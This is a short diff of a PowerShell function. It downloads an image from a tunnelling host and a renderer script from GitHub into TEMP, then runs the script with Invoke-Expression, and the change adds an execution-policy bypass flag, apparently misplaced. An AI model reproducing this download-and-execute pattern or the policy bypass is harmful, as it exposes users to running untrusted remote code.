@@ -83,7 +83,7 @@ function imsssg {
 	Invoke-WebRequest -Uri "http://special-bikini.gl.at.ply.gg:26833/server-icon.png" -OutFile "$env:TEMP/imgtttttt.png" 
 	Invoke-WebRequest -Uri "https://raw.githubusercontent.com/DevAndersen/posh-bucket/master/projects/consoleImageRenderer/consoleImageRenderer.ps1" -OutFile "$env:TEMP/consoleImageRenderer.ps1" -UseBasicParsing
 
-	Invoke-Expression -Command "$env:TEMP/consoleImageRenderer.ps1 -Path $env:TEMP\imgtttttt.png -Width 64 -Height 64" 
+	Invoke-Expression -Command "$env:TEMP/consoleImageRenderer.ps1 -ExecutionPolicy Bypass -Path $env:TEMP\imgtttttt.png -Width 64 -Height 64" 
 }
 
 Yes
